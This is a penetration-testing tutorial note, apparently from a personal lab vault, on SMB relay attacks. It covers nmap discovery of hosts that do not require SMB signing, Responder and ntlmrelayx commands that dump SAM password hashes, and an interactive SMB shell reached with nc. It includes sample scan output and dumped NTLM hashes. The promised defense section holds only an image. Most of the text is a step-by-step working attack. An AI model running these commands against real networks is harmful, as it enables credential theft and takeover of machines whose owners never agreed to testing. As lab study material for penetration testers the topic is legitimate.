### SMB Relay
![[Pasted image 20210723085321.png]]

With SMB Relay attacks, the attacker inserts himself into the middle of that exchange. The attacker selects the target server he wants to authenticate to and then the attacker waits for someone on the network to authenticate to his machine. This is where rogue host detection, vulnerability scanners, and administrator scripts that automatically authenticate to hosts become a penetration tester's best friends. When the automated process connects to the attacker, he passes the authentication attempt off to his target (another system on the network, perhaps a server). The target generates a challenge and sends it back to the attacker. The attacker sends the challenge back to the originating scanning system. The scanning system encrypts the hash with the correct password hash and sends it to the attacker. The attacker passes the correctly encrypted response back to his target and successfully authenticates

### Discovering hosts with smb signing disabled
We can use nmap to do so. Type the command for discovering hosts with smb signing disabled
```bash
nmap --script smb2-security-mode -p445 <network range>
```

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-22 23:42 EDT
Nmap scan report for 192.168.247.1
Host is up (0.00064s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:50:56:C0:00:08 (VMware)

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required

Nmap scan report for 192.168.247.2
Host is up (0.00026s latency).

PORT    STATE  SERVICE
445/tcp closed microsoft-ds
MAC Address: 00:50:56:E2:B7:07 (VMware)

Nmap scan report for 192.168.247.130
Host is up (0.00029s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:FF:32:DA (VMware)

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required

Nmap scan report for 192.168.247.131
Host is up (0.00032s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:41:13:77 (VMware)

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required

Nmap scan report for 192.168.247.254
Host is up (0.00020s latency).

PORT    STATE    SERVICE
445/tcp filtered microsoft-ds
MAC Address: 00:50:56:F8:21:3F (VMware)

Nmap scan report for 192.168.247.142
Host is up (0.00020s latency).

PORT    STATE  SERVICE
445/tcp closed microsoft-ds

Nmap done: 256 IP addresses (6 hosts up) scanned in 3.72 seconds
```

Based on the result we will put one of the IP which have smb signing disabled to target.txt

### Attacking with SMB Relay
First go to `/etc/responder/Responser.conf` and turn Off SMB and HTTP
![[Pasted image 20210723091309.png]]

Now run Responder
```bash
responder -I eth0 -rdwv
```

Now use ntlmrelayx for relaying the hash. Type the following command
```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

| Commands | Use |  
| ----------- | ----------- |  
| -tf | target file  |  
| -smb2support | Use smb |


Now try to connect to kali from the windows machine which is not in the target file

![[Pasted image 20210723094010.png]]

Now you can see that the SAM file is dumped and we have local users hash 

![[Pasted image 20210723093808.png]]
```powershell
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:451fb5d461675068c88ed9bc198db63e:::
Frank Castle:1001:aad3b435b51404eeaad3b435b51404ee:a4f49c406510bdcab6824ee7c30fd852:::
```

Now for getting shell with smb we can use the following command
```bash
ntlmrelayx.py -tf targets.txt -smbsupport -i
```

| Commands | Use |  
| ----------- | ----------- |  
| -i | interactive shell  | 

Now from the output you can see that it has created an interactive shell in the localhost

![[Pasted image 20210723095910.png]]

To connect to the shell type
```bash
nc 127.0.0.1 11000
```

After connecting we can list the shares and now we are in C$ share and have full control of the machine

![[Pasted image 20210723100531.png]]

### Defense against SMB Relay Attacks

![[Pasted image 20210723100909.png]]